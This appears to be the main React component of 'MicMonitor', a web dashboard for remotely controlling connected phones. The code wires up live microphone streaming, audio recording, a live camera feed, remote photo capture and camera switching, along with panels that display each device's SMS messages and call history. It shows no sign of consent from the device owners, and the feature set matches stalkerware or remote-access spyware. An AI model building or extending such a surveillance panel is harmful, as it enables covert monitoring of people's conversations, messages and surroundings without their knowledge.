import { useState, useCallback, useEffect } from 'react'
import { ControlButtons } from './components/dashboard/ControlButtons'
import { DeviceInfoPanel } from './components/dashboard/DeviceInfoPanel'
import { NetworkProfile } from './components/dashboard/NetworkProfile'
import { SMSPanel } from './components/dashboard/SMSPanel'
import { CallsPanel } from './components/dashboard/CallsPanel'
import { RecordingsPanel } from './components/dashboard/RecordingsPanel'
import { EventLog } from './components/dashboard/EventLog'
import { CameraLiveFeed } from './components/dashboard/CameraLiveFeed'
import { useDashboard } from './hooks/useDashboard'
import { useAudioPlayback } from './hooks/useAudioPlayback'
import { useWebRTC } from './hooks/useWebRTC'
import type { CameraFrame } from './types/dashboard'

function App() {
  const audioPlayback = useAudioPlayback()
  const webRTC = useWebRTC()
  const [cameraFrame, setCameraFrame] = useState<CameraFrame | null>(null)
  const [isCameraLive, setIsCameraLive] = useState(false)
  const [isRecording, setIsRecording] = useState(false)
  
  // Audio data callback - receives binary audio from WebSocket
  const handleAudioData = useCallback((data: ArrayBuffer, deviceId: string) => {
    audioPlayback.feedAudio(data, deviceId)
  }, [audioPlayback.feedAudio])

  // WebRTC message callback - handles signaling messages
  const handleWebRTCMessage = useCallback((msg: Record<string, unknown>) => {
    webRTC.handleMessage(msg)
  }, [webRTC.handleMessage])

  // Camera frame callback
  const handleCameraFrame = useCallback((frame: CameraFrame) => {
    setCameraFrame(frame)
    setIsCameraLive(true)
  }, [])

  const {
    wsState,
    devices,
    selectedDevice,
    selectedDeviceId,
    feed,
    photos,
    recordings,
    setSelectedDeviceId,
    sendCommand,
  } = useDashboard(handleAudioData, handleWebRTCMessage, handleCameraFrame)

  const [isListening, setIsListening] = useState(false)

  // Handle commands with audio/WebRTC awareness
  const handleCommand = useCallback((cmd: string, extra?: Record<string, unknown>) => {
    if (cmd === 'start_stream') {
      audioPlayback.start()
      setIsListening(true)
    } else if (cmd === 'stop_stream') {
      audioPlayback.stop()
      setIsListening(false)
    } else if (cmd === 'webrtc_start') {
      webRTC.start(sendCommand)
      return
    } else if (cmd === 'webrtc_stop') {
      webRTC.stop(sendCommand)
      return
    } else if (cmd === 'camera_live_start') {
      setIsCameraLive(true)
    } else if (cmd === 'camera_live_stop') {
      setIsCameraLive(false)
      setCameraFrame(null)
    } else if (cmd === 'start_record') {
      setIsRecording(true)
    } else if (cmd === 'stop_record') {
      setIsRecording(false)
    }
    sendCommand(cmd, extra)
  }, [audioPlayback.start, audioPlayback.stop, webRTC.start, webRTC.stop, sendCommand])

  // Auto-start audio playback when device connects and we're in listening mode
  useEffect(() => {
    if (isListening && !audioPlayback.state.isPlaying) {
      audioPlayback.start()
    }
  }, [isListening, audioPlayback.state.isPlaying, audioPlayback.start])

  // Clear camera frame when stream stops
  useEffect(() => {
    if (!isCameraLive) {
      const timeout = setTimeout(() => setCameraFrame(null), 3000)
      return () => clearTimeout(timeout)
    }
  }, [isCameraLive])

  const isWebRtcActive = webRTC.stats.state === 'connected' || webRTC.stats.state === 'connecting'

  return (
    <div className="min-h-screen bg-[radial-gradient(ellipse_at_top_right,_var(--tw-gradient-stops))] from-slate-900 via-[#0b1020] to-black text-slate-200 font-sans selection:bg-emerald-500/30">
      {/* Header */}
      <header className="border-b border-slate-700/50 bg-[#0d1424]/80 backdrop-blur-md sticky top-0 z-10 px-4 py-3 shadow-lg shadow-black/20">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg bg-emerald-500 flex items-center justify-center">
              <span className="text-white font-bold text-sm">M</span>
            </div>
            <div>
              <h1 className="text-lg font-bold text-white">MicMonitor</h1>
              <p className="text-[10px] text-slate-500 uppercase tracking-wider">Remote Audio Dashboard</p>
            </div>
          </div>
          
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-slate-800/40 backdrop-blur-sm border border-slate-700/50 shadow-inner">
              <span className={`w-2 h-2 rounded-full shadow-[0_0_8px_rgba(0,0,0,0.5)] ${wsState === 'open' ? 'bg-emerald-400 shadow-emerald-400/50' : wsState === 'connecting' ? 'bg-yellow-400 shadow-yellow-400/50 animate-pulse' : 'bg-red-400 shadow-red-400/50'}`}></span>
              <span className="text-sm font-medium tracking-wide text-slate-300">
                {wsState === 'open' ? 'CONNECTED' : wsState === 'connecting' ? 'CONNECTING...' : 'DISCONNECTED'}
              </span>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="p-4 space-y-4">
        {/* Connected Devices Label */}
        <div className="text-xs text-slate-500 uppercase tracking-wider">
          {devices.length} CONNECTED DEVICE{devices.length !== 1 ? 'S' : ''}
        </div>

        {/* Network Profile */}
        <NetworkProfile 
          lowNetwork={selectedDevice?.health?.lowNetwork}
          streamCodec={selectedDevice?.health?.streamCodec}
          streamCodecMode={selectedDevice?.health?.streamCodecMode}
          onForceToggle={() => handleCommand('set_low_network', { enabled: !selectedDevice?.health?.lowNetwork })}
        />

        {/* Device Selection Tabs (if multiple devices) */}
        {devices.length > 1 && (
          <div className="flex gap-2 flex-wrap">
            {devices.map((device) => (
              <button
                key={device.deviceId}
                onClick={() => setSelectedDeviceId(device.deviceId)}
                className={`px-3 py-1.5 text-sm rounded-lg transition-colors ${
                  selectedDeviceId === device.deviceId
                    ? 'bg-emerald-600 text-white'
                    : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
                }`}
              >
                {device.model || device.deviceId.substring(0, 8)}...
              </button>
            ))}
          </div>
        )}

        {/* Device Info Panel */}
        <DeviceInfoPanel 
          device={selectedDevice} 
          audioState={audioPlayback.state}
          webRTCState={webRTC.stats}
        />

        {/* Control Buttons */}
        <div className="rounded-lg border border-slate-700/50 bg-slate-800/30 p-4">
          <ControlButtons 
            onCommand={handleCommand}
            health={selectedDevice?.health}
            isStreaming={isListening || audioPlayback.state.isPlaying}
            isRecording={isRecording}
            isWebRtcActive={isWebRtcActive}
            isCameraLive={isCameraLive}
          />
        </div>

        {/* Camera and SMS/Calls Row */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
          <CameraLiveFeed
            frame={cameraFrame}
            photos={photos}
            onTakePhoto={() => handleCommand('take_photo')}
            onSwitchCamera={() => handleCommand('switch_camera')}
            onStopLive={() => handleCommand('camera_live_stop')}
          />
          <SMSPanel messages={selectedDevice?.sms || []} />
          <CallsPanel calls={selectedDevice?.calls || []} />
        </div>

        {/* Recordings and Event Log Row */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          <RecordingsPanel recordings={recordings} />
          <EventLog events={feed} />
        </div>
      </main>
    </div>
  )
}

export default App
